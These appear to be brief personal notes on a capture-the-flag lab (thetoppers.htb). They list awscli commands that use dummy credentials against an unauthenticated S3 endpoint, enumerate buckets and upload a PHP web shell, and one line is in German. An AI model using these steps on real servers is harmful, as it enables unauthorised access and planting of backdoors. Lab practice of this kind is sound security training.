apt install awscli

We will be using an arbitrary value for all the fields, as sometimes the server is configured to not check authentication
aws configure
4 mal “temp” angeben

We can list all of the S3 buckets hosted by the server by using the ls command.
aws --endpoint=http://s3.thetoppers.htb s3 ls

We can also use the ls command to list objects and common prefixes under the specified bucket.
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb

upload a shell
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
